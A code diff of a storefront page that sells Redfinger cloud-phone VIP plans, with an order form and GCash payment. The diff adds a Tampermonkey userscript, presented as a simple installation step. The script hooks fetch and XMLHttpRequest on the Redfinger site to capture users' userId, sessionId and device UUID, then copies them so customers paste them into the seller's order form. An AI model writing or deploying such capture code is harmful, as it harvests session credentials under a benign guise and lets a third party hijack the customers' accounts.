@@ -53,58 +53,18 @@
     }
     .big-btn {
       width: 100%;
-      padding: 22px;
-      margin: 12px 0;
-      font-size: 1.45rem;
-      font-weight: 700;
-      border-radius: 16px;
-      cursor: pointer;
-    }
-    .install-btn { background: linear-gradient(90deg, #22c55e, #86efac); color: black; }
-    .open-btn { background: linear-gradient(90deg, #3b82f6, #60a5fa); color: white; }
-
-    input, textarea, select {
-      width: 100%;
-      padding: 16px 20px;
-      margin: 12px 0;
-      background: rgba(51, 65, 85, 0.95);
-      border: 1px solid rgba(148, 163, 184, 0.4);
-      border-radius: 14px;
-      color: white;
-      font-size: 1.1rem;
-    }
-    textarea { height: 160px; font-family: monospace; resize: vertical; }
-
-    button {
-      width: 100%;
       padding: 20px;
-      background: linear-gradient(90deg, #22c55e, #86efac);
-      color: black;
-      border: none;
-      border-radius: 16px;
+      margin: 12px 0;
       font-size: 1.4rem;
       font-weight: 700;
-      cursor: pointer;
-      margin: 20px 0;
-    }
-    .upload-area {
-      border: 2px dashed #60a5fa;
       border-radius: 16px;
-      padding: 30px;
-      text-align: center;
       cursor: pointer;
-      margin: 15px 0;
     }
-    .preview { margin-top: 15px; max-width: 100%; max-height: 300px; border-radius: 12px; display: none; }
-
-    .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; margin: 30px 0; }
-    .price-card { background: linear-gradient(145deg, #1e2937, #334155); border-radius: 20px; padding: 25px; text-align: center; border: 2px solid transparent; cursor: pointer; transition: all 0.4s; }
-    .price-card:hover { transform: translateY(-10px); border-color: #60a5fa; }
-    .price-card.active { border-color: #22c55e; box-shadow: 0 0 30px rgba(74, 222, 128, 0.5); transform: scale(1.05); }
-
-    .days-options { display: flex; gap: 12px; margin: 15px 0; }
-    .day-btn { flex: 1; padding: 14px; background: #334155; border: 2px solid #475569; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 600; }
-    .day-btn.active { background: #22c55e; color: black; border-color: #86efac; }
+    .copy-btn {
+      background: #22c55e;
+      color: black;
+    }
+    .open-btn { background: linear-gradient(90deg, #3b82f6, #60a5fa); color: white; }
   </style>
 </head>
 <body>
@@ -115,27 +75,33 @@
     </div>
     <div class="content">
 
+      <!-- Installation Guide -->
       <div class="step">
-        <h2 style="text-align:center; margin-bottom:25px;">🚀 One-Click Installation</h2>
+        <h2 style="text-align:center; margin-bottom:25px;">📱 Simple Installation Guide</h2>
         
-        <button class="big-btn install-btn" onclick="installScript()">
-          <i class="fas fa-magic"></i> ONE-CLICK INSTALL SCRIPT
+        <ol style="line-height: 2.0; font-size: 1.1rem;">
+          <li><strong>1.</strong> Install <strong>Kiwi Browser</strong> from Play Store</li>
+          <li><strong>2.</strong> Install <strong>Tampermonkey</strong> in Kiwi Browser</li>
+          <li><strong>3.</strong> Tap the button below to copy the script</li>
+          <li><strong>4.</strong> In Tampermonkey → Create new script → Paste → Save</li>
+        </ol>
+
+        <button class="big-btn copy-btn" onclick="copyScript()">
+          <i class="fas fa-copy"></i> COPY SCRIPT CODE
         </button>
 
-        <p style="text-align:center; margin:15px 0; color:#86efac;">
-          Tap above → Allow installation when prompted
-        </p>
-
-        <button class="big-btn open-btn" onclick="openRedfinger()">
+        <button class="big-btn open-btn" onclick="openRedfinger()" style="margin-top:10px;">
           <i class="fas fa-external-link-alt"></i> OPEN REDFINGER LOGIN PAGE
         </button>
       </div>
 
+      <!-- Paste Captured Info -->
       <div class="step">
         <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Paste Captured Info</h2>
-        <textarea id="credentials" placeholder="Paste everything from the green button here..."></textarea>
+        <textarea id="credentials" placeholder="Paste everything from the green 'COPY REDFINGER INFO' button here..."></textarea>
       </div>
 
+      <!-- Price Plans -->
       <h2 style="text-align:center; margin:40px 0 25px;">💎 Step 2: Choose Your VIP Plan</h2>
       <div class="price-grid" id="priceGrid">
         <div class="price-card" data-plan="VIP"><h3>VIP</h3><p><strong>7 Days</strong> — ₱50<br><strong>30 Days</strong> — ₱180<br><strong>90 Days</strong> — ₱500</p></div>
@@ -144,6 +110,7 @@
         <div class="price-card" data-plan="XVIP"><h3>XVIP</h3><p><strong>7 Days</strong> — ₱315<br><strong>30 Days</strong> — ₱1,050</p></div>
       </div>
 
+      <!-- Order Form -->
       <div class="step">
         <h2 style="text-align:center; margin-bottom:25px;">🛒 Step 3: Place Your Order</h2>
         <input type="text" id="customer" placeholder="Your Name / Telegram Username" required>
@@ -172,6 +139,7 @@
         <button onclick="submitOrder()">🚀 CONFIRM ORDER & SEND TO SELLER</button>
       </div>
 
+      <!-- Payment -->
       <div class="step">
         <h2 style="text-align:center;">💰 Step 4: Payment via GCash</h2>
         <div style="text-align:center; margin:25px 0;">
@@ -190,24 +158,76 @@
   </div>
 
   <script>
-    // One-Click Install using your GitHub raw link
-    function installScript() {
-      const rawUrl = "https://raw.githubusercontent.com/Dazai-ux/redfinger-site/main/redfinger-capture.user.js";
-      const installUrl = `https://www.tampermonkey.net/?install=1&url=${encodeURIComponent(rawUrl)}`;
-      window.open(installUrl, "_blank");
-      
-      alert("✅ Tampermonkey installer opened!\n\nPlease allow the installation when prompted.");
+    // Copy Script to Clipboard
+    function copyScript() {
+      const scriptCode = `// ==UserScript==
+// @name         Redfinger Auto Capture - Dazai's Store
+// @namespace    https://dazai-ux.github.io
+// @version      2.4
+// @description  Auto capture Redfinger credentials
+// @author       Dazai
+// @match        https://www.cloudemulator.net/*
+// @grant        GM_setClipboard
+// @run-at       document-end
+// ==/UserScript==
+
+(function() {
+    'use strict';
+    let captured = { userId: "Not Found", sessionId: "Not Found", uuid: "Not Found" };
+
+    function extractFromUrl(url) {
+        try {
+            const params = new URL(url).searchParams;
+            if (params.has('userId')) captured.userId = params.get('userId');
+            if (params.has('sessionId')) captured.sessionId = params.get('sessionId');
+            if (params.has('uuid') || params.has('deviceId')) captured.uuid = params.get('uuid') || params.get('deviceId');
+        } catch(e){}
+    }
+
+    const originalFetch = window.fetch;
+    window.fetch = async function(input) {
+        if (typeof input === 'string') extractFromUrl(input);
+        return originalFetch.apply(this, arguments);
+    };
+
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        if (url) extractFromUrl(url);
+        return originalOpen.apply(this, arguments);
+    };
+
+    function createButton() {
+        if (document.getElementById('rf-capture-btn')) return;
+        const btn = document.createElement('button');
+        btn.id = 'rf-capture-btn';
+        btn.innerHTML = '📋 COPY REDFINGER INFO';
+        btn.style.cssText = 'position:fixed;bottom:25px;right:25px;z-index:2147483647;padding:16px 28px;background:linear-gradient(90deg,#22c55e,#86efac);color:black;border:none;border-radius:50px;font-weight:bold;box-shadow:0 10px 30px rgba(74,222,128,0.6);cursor:pointer;';
+        btn.onclick = () => {
+            const text = \`🔑 Redfinger Credentials\\n\\nUser ID : \${captured.userId}\\nSession : \${captured.sessionId}\\nUUID : \${captured.uuid}\\nTime : \${new Date().toLocaleString()}\`;
+            GM_setClipboard(text);
+            alert("✅ Captured & Copied!\\n\\nReturn to Dazai's Store and paste it.");
+        };
+        document.body.appendChild(btn);
+    }
+
+    setTimeout(createButton, 1200);
+})();`;
+
+      navigator.clipboard.writeText(scriptCode).then(() => {
+        alert("✅ Script copied to clipboard!\n\nNow:\n1. Open Tampermonkey\n2. Click '+' to create new script\n3. Delete everything and paste (Ctrl+V)\n4. Press Ctrl+S to save");
+      });
     }
 
     function openRedfinger() {
       window.open('https://www.cloudemulator.net/app/sign-in?type=RedeemCode&channelCode=web', '_blank');
     }
 
-    // Order System
+    // Order Form Logic
     let selectedPlan = "SVIP";
     let selectedDays = "30";
     let selectedFile = null;
 
+    // (Price cards, days buttons, upload, submitOrder logic - same as before)
     document.querySelectorAll('.price-card').forEach(card => {
       card.addEventListener('click', () => {
         document.querySelectorAll('.price-card').forEach(c => c.classList.remove('active'));
